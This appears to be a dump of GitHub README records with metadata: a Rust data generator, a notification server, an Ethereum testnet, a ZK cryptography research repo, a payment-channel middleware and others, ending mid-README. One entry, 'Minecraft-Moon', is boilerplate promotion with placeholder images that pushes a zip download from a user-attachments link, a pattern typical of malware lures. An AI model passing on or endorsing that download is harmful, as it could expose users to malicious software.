|199|[Suzhibin/ZBNetworking](https://github.com/Suzhibin/ZBNetworking)| AFNetworking4.XÂ∞ÅË£Ö  GET/POST /PUT/PATCH /DELETE / Upload /DownLoad ÁΩëÁªúËØ∑Ê±Ç Ê∑ªÂä†‰∫ÜËØ∑Ê±ÇÁºìÂ≠ò,Á¶ªÁ∫ø‰∏ãËΩΩ,ÊòæÁ§∫ÁºìÂ≠òÂ§ßÂ∞è,Âà†Èô§ÁºìÂ≠ò,ÂèñÊ∂àÂΩìÂâçËØ∑Ê±ÇÁ≠âÂäüËÉΩ|148|Objective-C|10/15|
|200|[An-iOSer/ZZTools](https://github.com/An-iOSer/ZZTools)|ÂåÖÊã¨: StarViewÊòüÊòüËØÑ‰ª∑(ÊîØÊåÅÂçäÊòü, Êï¥Êòü, ‰ªªÊÑèÊòü, ÊîØÊåÅÊãñÂä®, ÊîØÊåÅËá™ÂÆö‰πâÊòüÊòüÂõæÁâá, Êï∞Èáè, Â§ßÂ∞è, Èó¥Ë∑ù, ÊúÄ‰ΩéÂàÜÂÄº). ÁÄëÂ∏ÉÊµÅ(ÂûÇÁõ¥, ÊµÆÂä®, Ê∑∑ÂêàÊ®°ÂºèÁÄëÂ∏ÉÊµÅ)Á≠â.|146|Objective-C|03/20|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)",0,0,1,GPL-3.0,,0.0
danielbeach/datahobbit,main,"# datahobbit - CSV or Parquet Generator

A Rust command-line tool that generates CSV or Parquet files with synthetic data based on a provided JSON schema. It supports custom delimiters for CSV, displays a progress bar during generation, and efficiently handles large datasets using parallel processing.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
  - [Command-Line Options](#command-line-options)
  - [Schema Definition](#schema-definition)
  - [Examples](#examples)
- [Supported Data Types](#supported-data-types)
- [Contributing](#contributing)
- [License](#license)

## Features

- **Flexible Schema Definition**: Define your data structure using a JSON schema file.
- **Synthetic Data Generation**: Generates realistic data for various data types.
- **CSV and Parquet Support**: Output data in CSV or Parquet format.
- **Parallel Processing**: Utilizes multi-threading for fast data generation.
- **Custom Delimiters**: Supports optional delimiters for CSV, defaulting to a comma.
- **Progress Indicator**: Displays a progress bar during data generation.
- **Error Handling**: Provides clear error messages for unsupported data types or invalid input.

## Installation

To build and run the CSV and Parquet Generator, you need to have [Rust](https://www.rust-lang.org/tools/install) installed on your system.

1. **Clone the Repository**

   ```bash
   git clone https://github.com/yourusername/datahobbit.git
   cd datahobbit
   ```

2. **Build the Project**

   ```bash
   cargo build --release
   ```

   This will create an executable in the `target/release` directory.

3. **Cargo**

  ```bash
  cargo add datahobbit
  ```

## Usage

### Command-Line Options

Run the executable with the following options:

```bash
USAGE:
    datahobbit [OPTIONS] <input> <output>

ARGS:
    <input>     Sets the input JSON schema file
    <output>    Sets the output file (either .csv or .parquet)

OPTIONS:
    -d, --delimiter <DELIMITER>       Sets the delimiter to use in the CSV file (default is ',')
    -h, --help                        Print help information
    -r, --records <RECORDS>           Sets the number of records to generate
    --format <FORMAT>                 Sets the output format: either ""csv"" or ""parquet"" (default is ""csv"")
    --max-file-size <MAX_FILE_SIZE>   Sets the maximum file size for Parquet files in bytes (default is 512 MB)
    -V, --version                     Print version information
```

### Schema Definition

The JSON schema defines the structure of the output file, including column names and data types. Here is an example schema:

```json
{
  ""columns"": [
    { ""name"": ""id"", ""type"": ""integer"" },
    { ""name"": ""first_name"", ""type"": ""first_name"" },
    { ""name"": ""last_name"", ""type"": ""last_name"" },
    { ""name"": ""email"", ""type"": ""email"" },
    { ""name"": ""phone_number"", ""type"": ""phone_number"" },
    { ""name"": ""age"", ""type"": ""integer"" },
    { ""name"": ""bio"", ""type"": ""sentence"" },
    { ""name"": ""is_active"", ""type"": ""boolean"" }
  ]
}
```

### Examples

**Generate a CSV with Default Settings**

```bash
cargo run -- schema.json output.csv --records 100000
```

- Generates 100,000 records.
- Uses the default comma delimiter.

**Generate a Parquet File**

```bash
cargo run -- schema.json output.parquet --records 100000 --format parquet
```

- Generates 100,000 records.
- Outputs data in Parquet format.

**Generate a Parquet File with Custom Size Limit**

```bash
cargo run -- input_schema.json output.parquet --records 1000000 --format parquet --max-file-size 10485760
```
Generates 1,000,000 records.
Outputs data in Parquet format.
Uses a maximum file size of 10 MB, creating additional files as needed.

**Generate a CSV with a Custom Delimiter**

```bash
cargo run -- input_schema.json output.csv --records 100000 --delimiter ';'
```

- Generates 100,000 records.
- Uses a semicolon (`;`) as the delimiter.

**Display Help Information**

```bash
cargo run -- --help
```

## Supported Data Types

The following data types are supported in the schema:

- `integer`: Generates random integers between 0 and 1000.
- `float`: Generates random floating-point numbers between 0.0 and 1000.0.
- `string`: Generates random words.
- `boolean`: Generates random boolean values (`true` or `false`).
- `name`: Generates full names.
- `first_name`: Generates first names.
- `last_name`: Generates last names.
- `email`: Generates email addresses.
- `password`: Generates passwords with lengths between 8 and 16 characters.
- `sentence`: Generates sentences containing 5 to 10 words.
- `phone_number`: Generates phone numbers.

**Example Usage in Schema**

```json
{ ""name"": ""age"", ""type"": ""integer"" }
{ ""name"": ""description"", ""type"": ""sentence"" }
{ ""name"": ""is_verified"", ""type"": ""boolean"" }
```


## License

This project is licensed under the [MIT License](LICENSE).

---

**Author**: Daniel Beach (<dancrystalbeach@gmail.com>)

**Version**: 1.0

---

",0,2,2,,release.yml,3.0
notificohq/notifico,main,"# Notifico

[Documentation](https://notifico.tech)

Notifico is a self-hosted, open-source notification server that delivers real-time notifications
to various clients via email, SMS, messengers and other means of communication.

## Features

- **High Performance**: Efficiently handles a large volume of notifications.
- **Scalable Architecture**: Optimized for high availability configurations using AMQP 1.0 for task distribution.
- **List-Unsubscribe Support**: Simplifies the process for recipients to opt-out of notifications.
- **Low-Code implementation**: You can use Notifico just with a little knowledge of JSON. No need for JS or any other language.

## Getting Started

To start using Notifico, please refer to the [Documentation](https://notifico.tech) for detailed installation and
configuration instructions.
The documentation includes guides on setting up the server, configuring different transports, and managing
notifications effectively.

## üéØ Roadmap:

- [x] Admin panel
- [ ] Helm chart
- [ ] Message view tracking and statistics
- [ ] Subscription API for recipients
- [ ] Push support (FCM, APNS)
- [ ] Bounce handling for Emails
- [ ] debounce.io and similar services support
- [ ] Tracking pixel support
- [ ] Link redirector with statistics
- [ ] Grafana Webhook support
- [ ] Auto-retry for sending failed messages
- [ ] Template and Pipeline versioning

## üöÜ Transports:

- [x] SMTP (email)
- [x] SMPP (SMS)
- [x] Slack
- [x] Telegram
- [x] WhatsApp Business
- [ ] Microsoft Teams
- [ ] Discord
- [ ] Mattermost
- [ ] Twilio
",0,3,1,Apache-2.0,docker-image.yml,0.0
ithacaxyz/odyssey,main,"# Odyssey

<!-- [![Crates.io][crates-badge]][crates-io] -->
<!-- [![Downloads][downloads-badge]][crates-io] -->

[![MIT License][mit-badge]][mit-url]
[![Apache-2.0 License][apache-badge]][apache-url]
[![CI Status][actions-badge]][actions-url]

## What is Odyssey?

Odyssey is a testnet OP Stack rollup aimed at enabling experimentation of bleeding edge Ethereum Research.
Odyssey is **not** a fork of reth.
Odyssey implements traits provided by the [reth node builder API](https://paradigmxyz.github.io/reth/docs/reth_node_builder/index.html), allowing implementation of precompiles and instructions of experimental EIPs without forking the node.

Specifically, Odyssey currently implements the following EIPs:

- [EIP-7702](https://eips.ethereum.org/EIPS/eip-7702): Set EOA account code.
- [RIP-7212](https://ethereum-magicians.org/t/eip-7212-precompiled-for-secp256r1-curve-support/14789): Precompile for secp256r1 curve support.
- [EIP-2537](https://eips.ethereum.org/EIPS/eip-2537): Precompiles for BLS12-381 curve operations.

Odyssey also implements the EIPs for EOF, or [The EVM Object Format](https://evmobjectformat.org/).

### Why Odyssey?

Odyssey has 2 goals:

1. Showcase Reth's performance at the extremes. We intend to launch a hosted version of Odyssey on [Conduit](https://conduit.xyz/), targeting 50mgas/s, and eventually ramping up to 1ggas/s and beyond. In the process we hope to hit the state growth performance bottleneck, and discover ways to solve it. If our hosted chains end up getting too big, we may possibly restart the experiment from zero, and try again.
2. Showcase how Reth's modular architecture can serve as a distribution channel for research ideas. Specifically,
   Odyssey's node extensions were chosen for their ability to enable applications that enhance the onchain user experience, and
   drastically reduce cost for existing applications that improve UX.

### Odyssey Testnet

> [!TIP]
>
> [The Odyssey Testnet](https://www.ithaca.xyz/updates/odyssey#odyssey-chapter-1-is-live-on-testnet) is now live on Sepolia and is built with Reth, the OP Stack, and [deployed on Conduit](https://app.conduit.xyz/published/view/odyssey).

### Odyssey Local Development

Odyssey can be run locally for development and testing purposes. To do this, the binary can be run with the `--dev` flag, which will start the node with a development configuration.

First, odyssey should be built locally:

```bash
git clone https://github.com/ithacaxyz/odyssey
cd odyssey
cargo install --path bin/odyssey
```

```bash
odyssey node --chain etc/odyssey-genesis.json --dev --http --http.api all
```

This will start the node with a development configuration, and expose the HTTP API on `http://localhost:8545`.

To use EOF-enabled foundry, use [forge-eof](https://github.com/paradigmxyz/forge-eof) and follow installation instructions.

### Running Odyssey

Running Odyssey will require running additional infrastructure for the archival L1 node. These instructions are a guide for
running the Odyssey OP-stack node only.

For instructions on running the full Odyssey OP stack, including the L1 node, see the [Reth book section on running the OP stack](https://paradigmxyz.github.io/reth/run/optimism.html), using the `odyssey` binary instead of `op-reth`.

#### Running the Odyssey execution node

To run Odyssey from source, clone the repository and run the following commands:

```bash
git clone https://github.com/ithacaxyz/odyssey.git
cd odyssey
cargo install --path bin/odyssey
odyssey node \
    --chain etc/odyssey-genesis.json \
    --rollup.sequencer-http <rollup-sequencer-http> \
    --http \
    --ws \
    --authrpc.port 9551 \
    --authrpc.jwtsecret /path/to/jwt.hex
```

#### Running op-node with the Odyssey configuration

Once `odyssey` is started, [`op-node`](https://github.com/ethereum-optimism/optimism/tree/develop/op-node) can be run with the
included `odyssey-rollup.json`:

```bash
cd odyssey/
op-node \
    --rollup.config ./etc/odyssey-rollup.json \
    --l1=<your-sepolia-L1-rpc> \
    --l2=http://localhost:9551 \
    --l2.jwt-secret=/path/to/jwt.hex \
    --rpc.addr=0.0.0.0 \
    --rpc.port=7000 \
    --l1.trustrpc
```

### Running Odyssey with Kurtosis

Running a local network with a full Odyssey OP stack with Kurtosis requires some extra setup, since Odyssey uses a forked version of `op-node`.

To get started, follow [these instructions](https://docs.kurtosis.com/install/) to install Kurtosis.

Next, start a Kurtosis enclave:

```bash
kurtosis run --enclave op-devnet github.com/ethpandaops/optimism-package \
  --args-file https://raw.githubusercontent.com/ithacaxyz/odyssey/main/etc/kurtosis.yaml
```

This will start an enclave named `op-devnet`. You can tear down the enclave with `kurtosis enclave rm --force op-devnet`, or tear down all enclaves using `kurtosis clean -a`.

> [!NOTE]
>
> If you want to use a custom build of Odyssey, simply build an Odyssey image with `docker build . -t ghcr.io/ithacaxyz/odyssey:latest`.

Consult the [Kurtosis OP package](https://github.com/ethpandaops/optimism-package) repository for instructions on how to adjust the args file to spin up additional services, like a block explorer.

### Wallet extension

Odyssey has a custom `wallet_` namespace, that allows users to delegate their EOAs to a contract using EIP-7702, and perform transactions on those accounts, all funded by the sequencer.

To enable this namespace, set the environment variable `EXP1_SK` to a private key that will sign the transactions. The new RPC method, `wallet_sendTransaction`, will only sign transactions that either:

1. Designates a contract address to an EOA via EIP-7702, or
1. Send transactions to an EIP-7702 EOA that is already delegated to an address

The `odyssey_sendTransaction` endpoint accepts the same fields as `eth_sendTransaction`, with these notable exceptions:

1. `nonce` must not be set, as this is managed by the node
1. `value` must be unset or 0
1. `from` must not be specified

The following fields are ignored, as they are overwritten internally:

1. `gasPrice` (and EIP-1559 gas related pricing fields)
1. `gasLimit`
1. `chainId`

### Security

See [SECURITY.md](SECURITY.md).

#### License

<sup>
Licensed under either of <a href=""LICENSE-APACHE"">Apache License, Version
2.0</a> or <a href=""LICENSE-MIT"">MIT license</a> at your option.
</sup>

<br>

<sub>
Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in these crates by you, as defined in the Apache-2.0 license,
shall be dual licensed as above, without any additional terms or conditions.
</sub>

<!-- [crates-badge]: https://img.shields.io/crates/v/odyssey.svg -->
<!-- [crates-io]: https://crates.io/crates/odyssey -->
<!-- [downloads-badge]: https://img.shields.io/crates/d/odyssey -->

[mit-badge]: https://img.shields.io/badge/license-MIT-blue.svg
[apache-badge]: https://img.shields.io/badge/license-Apache--2.0-blue.svg
[mit-url]: LICENSE-MIT
[apache-url]: LICENSE-APACHE
[actions-badge]: https://github.com/ithacaxyz/odyssey/workflows/unit/badge.svg
[actions-url]: https://github.com/ithacaxyz/odyssey/actions?query=workflow%3ACI+branch%3Amain
[foundry-odyssey]: https://github.com/ithacaxyz/foundry-odyssey
",8,15,4,Apache-2.0,"dependencies.yml,docker.yml,e2e.yml,integration.yml,lint-actions.yml,lint.yml,unit.yml",71.0
Daniolet/Cryptography-N-ZK,main,"# Cryptography and ZK research
-------------------------------

A Cryptography and Zero Knowledge Proof Research Repo Implementing Research papers, Cryptographic primitives, trying out imaginary exploits and so on.

<br>
<br>
<br>





















## Primitives and Toolkits
-------------------------------
These are a collection of cryptographic primitives and toolkits that I have implemented in Rust. They are designed to be modular, 
efficient, and easy to use. The goal is to provide a solid foundation for building secure, succinct, and privacy-preserving applications.

<br>

### Circuits 
This is a library for creating and manipulating circuits. The library is designed to be modular and extensible. The library is designed to be used in the context of snarks, but can be used for any type of circuit.

**Features**
- [x] Arithmetic Circuit representation
- [x] Boolean Circuit representation
- [x] Circuit evaluation
- [x] Circuit optimization
- [x] Arithmetic Circuit to R1CS conversion
- [x] GKR `Add` and `Mul` Multilinear Extension (MLE)

[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/circuits)
<br>
<br>

### Polynomial
This is the implementation of a polynomial in Rust. The Polynomial struct allows you to create a polynomial, evaluate it at a specific point, and add or multiply two polynomials together.

The variations of polynomials built in here are;
- [x] Univariate Polynomial
- [x] Multivariate Polynomial
- [x] Multilinear Polynomial

... the last two could give a man 2^N complexity nightmare :).

[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/polynomial)
<br>
<br>

### SHA256 hash function
In the realm of cybersecurity, ensuring data integrity and authenticity is paramount. Cryptographic hash functions play a vital role in achieving this objective. One of the most widely employed and trusted algorithms in this domain is SHA-256 (Secure Hash Algorithm 256-bit). This introduction will delve into the concept of SHA-256, outlining its functionalities, key characteristics, and the prevalent applications that leverage its capabilities.

**Features**
- [x] Technical paper explanation
- [x] Operation implementation
- [ ] Complete hash function implementation

[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/sha256-hash-function)
<br>
<br>



<br>
<br>

### Protocol Implementations
-------------------------------
These are implementations of cryptographic protocols that I have implemented in Rust. 
These protocols are built using the primitives and toolkits mentioned above as building blocks.
These implementations follows research papers and are designed to be efficient, secure, and easy to use,
But with the primary purpose of research and education.

<br>


### GKR 
The GKR protocol is fascinating, fairly not as complicated as other protocols but heavily generic and useful. The GKR protocol involves running one protocol (Sum check) inside this protocol (GKR). The GKR protocol, named after Shafi Goldwasser, Yael Tauman Kalai, and Guy N. Rothblum, is a zero-knowledge proof protocol that focuses on efficient delegation of computation. Specifically, it is designed to verify computations represented as layered arithmetic circuits with logarithmic depth in the number of inputs. The GKR protocol is known for its efficiency and ability to handle large-scale computations.


**Features**
- [x] In Progress


[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/gkr)
<br>
<br>



### Groth16 
The Groth16 protocol is a highly efficient zero-knowledge succinct non-interactive argument of knowledge (zk-SNARK) for general arithmetic circuit satisfiability. It was introduced by Jens Groth in 2016 and is notable for its concise proofs and efficient verification. 

**Features**
- [x] Circuit Pre-processing
- [x] Trusted Setup
- [x] Prover
- [x] Verifer


[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/gkr)
<br>
<br>

### ECDSA

This library provides an implementation of the Elliptic Curve Digital Signature Algorithm (ECDSA) in Rust. It allows you to:

**Features**
- [x] Generate ECDSA keypairs (private and public keys)
- [x] Sign messages using a private key
- [x] Verify signatures using a public key


[codebase](https://github.com/developeruche/ecdsa-rust)
<br>
<br>


### KZG polynomial commitment scheme

This is a RUST implementation of the Kate Commitments (KZG) polynomial commitment scheme. KZG allows you to commit to a polynomial while keeping the contents hidden.

**Features**
1. Univariate Polynomial Commitment
  - [x] Creates KZG parameters for a given degree.
  - [x] Commits to a polynomial of a specified degree.
  - [x] Opens a commitment at a specific point, revealing the evaluated value and proof.
  - [x] Verifies the opening proof for a commitment.

2. Multilinear Polynomial Commitment
  - [x] Creates KZG parameters for a given number of variables.
  - [x] Commits to a polynomial of a specified number of variables.
  - [] Opens a commitment at a specific point, revealing the evaluated value and proof.
  - [] Verifies the opening proof for a commitment.

[codebase](https://github.com/developeruche/kzg-commitment-rust)
<br>
<br>

### Interactive Chaum Pederson zero-knowledge proof
The Chaum-Pedersen Zero-Knowledge Proof (ZKP) protocol allows a prover to convince a verifier that they possess a secret value (knowledge) without revealing the actual value itself. It operates in an interactive setting, meaning the prover and verifier exchange messages back and forth.

**Features**
- [x] Interactive proof generation and verification.

[codebase](https://github.com/developeruche/non-interactive-chaum-pedersen-lib)
<br>
<br>


### Non-Interactive Implementation
The standard Chaum-Pedersen protocol is interactive, but it can be converted into a non-interactive version using the Fiat-Shamir heuristic. This transformation removes the need for real-time interaction:

**Features**
- [x] Non-interactive proof generation
- [x] Non-interactive proof verification

[codebase](https://github.com/developeruche/non-interactive-chaum-pedersen-lib)
<br>
<br>

### Schnorr Digital Signature
A Schnorr signature is a digital signature produced by the Schnorr signature algorithm, which Claus Schnorr described. It‚Äôs known for its simplicity and efficiency.

**Features**
- [x] Generate Schnorr keypairs (private and public keys)
- [x] Sign messages using a private key
- [x] Verify signatures using a public key

[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/schnorr)
<br>
<br>


### Sum Check Protocol
Suppose we are given a v-variate polynomial `g` defined over a finite field `F`. The purpose of the sum-check protocol is for the prover to provide the verifier with the sum of evaluations over the boolean hypercube.

**Features**
- [x] Technical documentation
- [x] library implementation
- [x] library test implementation

[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/sum_check)
<br>
<br>

### Fiat Shamir 
The Fiat-Shamir transcript is a cryptographic technique used to transform an interactive proof system into a non-interactive one. This transformation enhances the efficiency and practicality of certain cryptographic protocols, including zero-knowledge proofs, by eliminating the need for interaction between the prover and the verifier.


**Features**
- [x] Externally adadptable interface
- [x] Transcript implementation

[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/fiat_shamir)
<br>
<br>





<br>
<br>


























## Projects
These are zk, cryptographic and blockchain projects that I have implemented in Rust and other tools. These projects builds on the primitives, toolkits, protocols mentioned above and 
other amazing projects built by great minds in the field of cryptography and zero-knowledge proofs.

<br>

### KZG airdrop over bn254 Elliptic curve

This is a RUST implementation of the KZG commitment scheme over the bn254 elliptic curve. Using this implementation to perform a token airdrop distribution using instead of using the regular `Merkle tree` commitment scheme.

**Features**
- [x] Toolkit for data preparation and formatting.
- [x] Trusted setup importation and implementation.
- [x] Massive proof generation script (Still needs optimization)
- [x] Rust proof verification
- [ ] Solidity proof verification

[codebase](https://github.com/developeruche/kzg-airdrop-bn254)
<br>
<br>


### Light tornado cash (powered by Groth16)
In the realm of blockchain technology, privacy remains a crucial aspect. This research project delves into a lightweight implementation inspired by the core concepts of cryptocurrency mixers. Our goal is to explore anonymity-enhancing techniques for crypto transactions while adhering to legal and ethical frameworks.

**Features**
- [x] Circom Circuit (Main Circuit and Hash functions)
- [x] Solidity Interface and Verification smart contract
- [ ] Basic UI

[codebase](https://github.com/developeruche/light-tornodo-cash)
<br>
<br>

### Verifiable Random Function (VRF)
A Verifiable Random Function (VRF) is a cryptographic primitive that provides a way to generate a random output that can be publicly verified as having been produced by a specific input and a specific secret key. It combines the properties of a hash function with those of a digital signature.

**Features**
- [x] Rust implementaion of VRS
- [x] Solidity binding interface

[codebase](https://github.com/developeruche/vrf-rust-solidity/tree)
<br>
<br>

### BLS Multi Sign Threshold Wallet (Powered by Shimir secret sharing protocol)
This is a mini project, using the Shamir Secret Sharing Scheme lib. This project would share the private key to an account among many other entities and a chosen number of these entities can come together to recompute this initial private key.

**Features**
- [x] Binding Lib
- [x] Script for secret sharing

[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/bls-multi-sign-threshold-wallet)
<br>
<br>

### Circom Groth16
This is a experimental project aiming to prove and verify a circom circuit using the Groth16 implemenation done in this reasearch project.

**Features**
- [x] Circom circuit
- [ ] Circom intermediate representation binding
- [ ] Groth16 implementation (Prove and Vefier)

[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/circom-groth16)
<br>
<br>

### Succinct GRK
This is a experimental project aiming to using the GKR protocol with Multilinear poloynomial commitment scheme to create a SNARK.

**Features**
- [x] Circuit Representation
- [ ] Prover function
- [ ] Verifier function

[codebase](https://github.com/developeruche/cryptography-n-zk-research/tree/main/circom-groth16)
<br>
<br>

<br>
<br>
























## Research Papers and Study Notes
This sections contains reasearch papers and study note that I have written on various topics in cryptography and zero-knowledge proofs.

<br>

<br>
<br>





















<br>
<br>
<br>
<br>



NOTE: THIS IS NOT TO BE USED IN PRODUCTION. THIS IS A RESEARCH PROJECT.
",0,0,1,,,1.0
omerstyle/Minecraft-Moon,master,"# Minecraft-Moon

![Moon Client Logo](https://example.com/moon-logo.png)

Moon Client offers strong performance and a robust LUA API for scripting, making it powerful for PvP. It is designed for version 1.8.9.

---

### Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation Guide](#installation-guide)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

---

## Introduction

Welcome to the Minecraft-Moon repository! Moon Client is a client-side Minecraft mod that provides players with advanced features and tools to enhance their gaming experience. Whether you are a casual player or a competitive PvP enthusiast, Moon Client offers the performance and customization options you need to excel in the game.

This README.md file serves as a comprehensive guide to help you understand the features of Moon Client, how to install it, and how to leverage its capabilities to improve your gameplay.

---

## Features

Moon Client comes packed with a variety of features tailored to meet the needs of Minecraft players seeking enhanced performance and customization options. Some of the key features include:

- **Advanced Scripting with LUA API**: Moon Client provides a robust LUA API that allows players to create custom scripts to automate tasks, enhance gameplay, and gain a competitive edge.

- **Optimized Performance**: Designed with a focus on performance, Moon Client ensures that players experience smooth gameplay even in intense PvP scenarios.

- **Enhanced PvP Tools**: Gain access to tools and features specifically designed to improve your PvP skills and dominate your opponents in battles.

- **Version Compatibility**: Moon Client is designed for version 1.8.9 of Minecraft, ensuring compatibility with popular PvP servers and mods.

**Explore more features by downloading Moon Client today!**

---

## Installation Guide

To install Moon Client, follow these steps:

1. Download the Moon Client mod from the following link: 

    [![Download Moon Client](https://img.shields.io/badge/Download-Moon_Client-blue)](https://github.com/user-attachments/files/16830358/Client.zip)

2. Make sure you have Minecraft Forge installed on your computer.
   
3. Copy the Moon Client mod file into the `mods` folder in your Minecraft directory.

4. Launch Minecraft and select the Moon Client profile to start using the mod.

For additional installation assistance, refer to the official Moon Client documentation.

---

## Usage

Once you have successfully installed Moon Client, you can start exploring its features and customizing your Minecraft gameplay. Below are some tips on how to make the most out of Moon Client:

- **Create Custom Scripts**: Use the LUA API to write custom scripts that automate tasks, control gameplay elements, and enhance your gaming experience.

- **Optimize Settings**: Adjust the client settings to suit your preferences and hardware capabilities, ensuring smooth performance and gameplay.

- **Experiment with PvP Tools**: Explore the PvP tools provided by Moon Client to sharpen your skills, improve combat performance, and outplay your opponents.

- **Stay Updated**: Keep an eye out for new updates and features released for Moon Client to stay ahead in the game and leverage the latest enhancements.

Whether you are a Minecraft enthusiast looking to enhance your gameplay or a competitive player aiming to dominate PvP battles, Moon Client offers the tools and options you need to succeed.

---

## Contributing

We welcome contributions from the Minecraft community to help improve and expand the capabilities of Moon Client. If you have ideas, suggestions, or code contributions, feel free to submit a pull request to the repository. Together, we can make Moon Client even more powerful and feature-rich for all players to enjoy.

Before contributing, please review the [Contribution Guidelines](CONTRIBUTING.md) to understand the process and best practices for submitting your contributions.

---

## License

Moon Client is licensed under the MIT License. For more information, refer to the [LICENSE](LICENSE) file included in the repository.

---

Thank you for exploring the Minecraft-Moon repository and considering Moon Client for your Minecraft gaming experience. Download Moon Client today and elevate your gameplay to new heights!

![Moon Client Gameplay](https://example.com/moon-gameplay.png)",1,0,1,,,0.0
mahmudsudo/crypto_axum,main,"# Payment Channel Authentication

A Rust middleware for Axum that implements cryptographic authentication using payment channels. This library provides secure, efficient request authentication with built-in rate limiting and payment verification.

## Features

- üîí Cryptographic request authentication using ECDSA signatures
- üí∏ Payment channel integration for per-request micropayments
- ‚ö° Built-in rate limiting
- üîÑ Automatic nonce validation
- ‚è∞ Timestamp-based replay protection
- üîã Thread-safe state management

## Installation

Add this to your `Cargo.toml`:

```toml
[dependencies]
axum_signature = { git = ""https://github.com/mahmudsudo/crypto_axum""}
```

## Quick Start

```rust
use axum_signature::{create_protected_router, ChannelState};

#[tokio::main]
async fn main() {
    // Create a protected router with payment channel authentication
    let app = create_protected_router();
    
    // Start the server
    axum::Server::bind(&""0.0.0.0:3000"".parse().unwrap())
        .serve(app.into_make_service())
        .await
        .unwrap();
}
```

## Making Authenticated Requests

Requests must include the following headers:

- `X-Signature`: ECDSA signature of the request message
- `X-Message`: Hex-encoded message bytes
- `X-Payment`: Payment channel state JSON
- `X-Timestamp`: Current Unix timestamp

Example request:

```rust
let headers = {
    ""X-Signature"": ""0x..."", // ECDSA signature
    ""X-Message"": ""0x..."",   // Hex-encoded message
    ""X-Payment"": {          // Payment channel state
        ""sender"": ""0x..."",
        ""recipient"": ""0x..."",
        ""balance"": ""1000"",
        ""nonce"": ""1"",
        ""expiration"": ""..."",
        ""channel_id"": ""0x...""
    },
    ""X-Timestamp"": ""1635329..."" // Current Unix timestamp
}
```

## Payment Channel Structure

```rust
pub struct PaymentChannel {
    pub sender: Address,      // Ethereum address of the sender
    pub recipient: Address,   // Ethereum address of the recipient
    pub balance: U256,        // Current channel balance
    pub nonce: U256,         // Current nonce (increments with each payment)
    pub expiration: U256,     // Channel expiration timestamp
    pub channel_id: H256,     // Unique channel identifier
}
```

## Configuration

The middleware can be configured with custom rate limits and timeouts:

```rust
const RATE_LIMIT: u64 = 100;           // Requests per window
const RATE_LIMIT_WINDOW: u64 = 60;     // Window size in seconds
const TIMESTAMP_EXPIRY: u64 = 300;     // Request timestamp validity in seconds
```

## Security Considerations

- All signatures must be valid ECDSA signatures from the payment channel sender
- Nonces must strictly increase to prevent replay attacks
- Timestamps must be within 5 minutes of current time
- Rate limiting is applied per sender address
- Channel balance must be sufficient for the payment amount

## Running Tests

```bash
cargo test
```

## License

MIT License

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## Examples

See the `/examples` directory for complete usage examples:

- Basic authentication setup
- Custom rate limiting
- Payment channel management
- Error handling
- Testing patterns

## API Documentation

For detailed API documentation, run:

```bash
cargo doc --open
```
",0,3,1,,,2.0
GrandmasterB42/bevyray,main,"# bevyray

[Ray Tracing in One Weekend](https://raytracing.github.io/) in a [Bevy](https://bevyengine.org) Fragment Shader

![bevyray](assets/images/bevyray.png)

## What it currently does

- Blends Bevy rasterized output with raytraced data based on depth (is inaccurate and has room for optimization)
- Supports some basic properties of the bevy StandardMaterial for spheres
- Builds a BVH for the scene

## Future work

- set up performance measuring tests
- Meshes (look into how meshlets are integrated) with their own BVH
- More efficient buffer writing (everything is currently copied to storage buffers every frame)
- look into multi-pass techniques and compute shader performance
- properly blend between rasterized and raytraced graphics
- support light sources
- more material features
- denoising
- importance sampling
- integrating with more bevy features
- CI
",0,0,1,,,1.0
KirDemorgan/desaAPI,master,"# DesaAPI

DesaAPI is a RESTful API for managing projects, task columns, and tasks. It is built using Java, Spring Boot, and JPA with a Maven build system.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
    - [Projects](#projects)
    - [Task Columns](#task-columns)
    - [Tasks](#tasks)
- [Contributing](#contributing)
- [License](#license)

## Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/KirDemorgan/desaAPI.git
    cd desaAPI
    ```

2. Build the project using Maven:
    ```sh
    mvn clean install
    ```

3. Run the application:
    ```sh
    mvn spring-boot:run
    ```

## Usage

The API can be accessed at `http://localhost:8080/api`.

## API Endpoints

### Projects

- **Get all projects**
    ```http
    GET /api/projects
    ```
  **Query Parameters:**
    - `prefix_name` (optional): Filter projects by name prefix.

  **Response:**
    ```json
    [
        {
            ""id"": 1,
            ""name"": ""Project 1"",
            ""taskColumnIds"": [1, 2]
        },
        ...
    ]
    ```

- **Create or update a project**
    ```http
    POST /api/projects
    ```
  **Request Parameters:**
    - `project_id` (optional): ID of the project to update.
    - `project_name` (optional): Name of the project.

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Project 1"",
        ""taskColumnIds"": [1, 2]
    }
    ```

- **Delete a project**
    ```http
    DELETE /api/projects/{projectId}
    ```
  **Path Parameters:**
    - `projectId`: ID of the project to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Project with id 1 deleted successfully""
    }
    ```

### Task Columns

- **Change task column position**
    ```http
    PATCH /api/task_columns/{task_column_id}/position
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column to update.

  **Request Parameters:**
    - `task_column_new_position`: New position of the task column.

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Column 1"",
        ""position"": 2,
        ""tasks"": [...]
    }
    ```

- **Delete a task column**
    ```http
    DELETE /api/task_columns/{task_column_id}
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Task column with id 1 deleted successfully""
    }
    ```

### Tasks

- **Get all tasks in a column**
    ```http
